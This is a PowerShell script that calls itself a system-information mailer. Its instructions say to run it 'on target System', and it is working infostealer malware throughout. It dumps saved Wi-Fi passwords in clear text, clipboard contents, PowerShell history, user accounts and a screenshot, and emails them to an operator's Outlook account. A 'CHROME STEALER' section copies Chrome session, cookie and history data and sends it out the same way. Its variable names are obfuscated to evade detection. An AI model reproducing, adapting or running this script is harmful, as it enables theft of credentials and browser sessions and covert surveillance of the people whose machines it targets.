<#
============================================= Mon's System Information to Email Script ========================================================

SYNOPSIS
This script gathers various system information and sends an email to a desired address with the results.

WARNINGS
This script Uses smtp Email and requires an OUTLOOK/HOTMAIL Email address to be able to send Emails as
most other email providers use other protocols.

USAGE
1. Input your credentials below (Hotmail/Outlook ONLY)
2. Run Script on target System
3. Check Email for results

#>

#========================================================= INPUT YOUR EMAIL CREDENTIALS HERE ==============================================================

#EMAIL ADDRESS
$htffthft = "EMAIL_HERRE"

#PASSWORD
$pijkhgh = "PASSWORD_HERE"

#====================================================================== INFO SCRAPE ==============================================================================


#--------------------------------- User info Check ---------------------------------------

$userString = "Username: $($userInfo.Name)"
$userString += "`nFull Name: $($userInfo.FullName)`n"

$userString+="Public Ip Address = "
$userString+=((I`wr ifconfig.me/ip).Content.Trim() | Out-String)
$userString+="`n"
$userString+="All User Accounts: `n"
$userString+= Get-WmiObject -Class Win32_UserAccount

#--------------------------------- System info Check ---------------------------------------

$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
$biosInfo = Get-WmiObject -Class Win32_BIOS
$processorInfo = Get-WmiObject -Class Win32_Processor
$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount

$systemString = "Operating System: $($systemInfo.Caption) $($systemInfo.OSArchitecture)"
$systemString += "`nBIOS Version: $($biosInfo.SMBIOSBIOSVersion)"
$systemString += "`nProcessor: $($processorInfo.Name)"
$systemString += "`nMemory: $($systemInfo.TotalVisibleMemorySize) MB"
$systemString += "`nComputer Name: $($computerSystemInfo.Name)"

#--------------------------------- Installed Programs Check ---------------------------------------

$installedPrograms = Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version

$programsString = "Installed Programs:`n"
foreach ($program in $installedPrograms) {
    $programsString += "  $($program.Name) $($program.Version)`n"
}

#--------------------------------- SSID + Password Check ---------------------------------------

$a=0
$ws=(netsh wlan show profiles) -replace ".*:\s+"
foreach($s in $ws)
{if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){

$ssid=$s.Trim()
if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()
}
$pw=(netsh wlan show profiles name=$ssid key=clear)
$pass="None"
foreach($p in $pw){
if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim()
$wifistring+="SSID: $ssid`nPassword: $pass`n"}}}$a++;}

#--------------------------------- Save Collected info ---------------------------------------

$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

"------------------------   USER INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII
$userString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------   CLIPBOARD INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
Get-Clipboard | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------   POWERSHELL HISTORY --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
Get-Content $pshist | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------  SYSTEM INFO  --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
$systemString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------   WIFI INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
$wifistring | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------ PROGRAMS INFO --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
$programsString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append

Write-Output "System and user information saved to text file."

#====================================================================== TAKE SCREENSHOT ==============================================================================

$Filett = "$env:temp\SC.png"
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)

Start-Sleep 3

#====================================================================== SEND ALL COLLECTED INFO ==============================================================================
Write-Output "Sending info..."

$vsdvvservd = "$env:temp\SC.png"
$adawdxcaec = "$env:temp\systeminfo.txt"

$vrdiugb = "$env:COMPUTERNAME : : Results"
$bfsvvrnbn = "$env:COMPUTERNAME : Info Scraper Results... : $tfhftttt"
$rtthtegtd = "smtp.outlook.com"
$rgdgthyu = "587"
$gtthyuyju = new-object Management.Automation.PSCredential $htffthft, ($pijkhgh | ConvertTo-SecureString -AsPlainText -Force)
$tfhftttt = Get-Date
$nytdrvd = $tfhftttt.addminutes($ughnfyd)

$sack = "$env:temp\SC.png"
If (Test-Path $sack) {
send-mailmessage -from $htffthft -to $htffthft -subject $vrdiugb -body $bfsvvrnbn -Attachment $adawdxcaec,$vsdvvservd -smtpServer $rtthtegtd -port $rgdgthyu -credential $gtthyuyju -usessl  
}
Else {
send-mailmessage -from $htffthft -to $htffthft -subject $vrdiugb -body $bfsvvrnbn -Attachment $adawdxcaec -smtpServer $rtthtegtd -port $rgdgthyu -credential $gtthyuyju -usessl
}


#=============================== CHROME STEALER ===========================

$ChromeFolderN = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Network"
$ChromeFolderS = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Sessions"
$ChromeFolderSS = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Session Storage"
$ChromeHistory = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
$ChromeBookmarks = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"

cp $ChromeFolderN $env:temp -Recurse
cp $ChromeFolderS $env:temp -Recurse
cp $ChromeFolderSS $env:temp -Recurse
cp $ChromeHistory $env:temp
cp $ChromeBookmarks $env:temp

Sleep 1

$C1 = "$env:temp\Network"
$C2 = "$env:temp\Sessions"
$C3 = "$env:temp\Session Storage"
$C4 = "$env:temp\Bookmarks"
$C5 = "$env:temp\History"

Write-Output "Zipping gathered files..."
Compress-Archive $C1,$C2,$C3,$C4,$C5 -DestinationPath $env:temp\Chrome.zip -force 

Write-Output "Sending Files..."

$gdgdgdg = "$env:temp\Chrome.zip"

$vrdiugb = "$env:COMPUTERNAME : : Results"
$bfsvvrnbn = "$env:COMPUTERNAME : Info Scraper Results... : $tfhftttt"
$rtthtegtd = "smtp.outlook.com"
$rgdgthyu = "587"
$gtthyuyju = new-object Management.Automation.PSCredential $htffthft, ($pijkhgh | ConvertTo-SecureString -AsPlainText -Force)
$tfhftttt = Get-Date
$nytdrvd = $tfhftttt.addminutes($ughnfyd)


send-mailmessage -from $htffthft -to $htffthft -subject $vrdiugb -body $bfsvvrnbn -Attachment $gdgdgdg -smtpServer $rtthtegtd -port $rgdgthyu -credential $gtthyuyju -usessl  


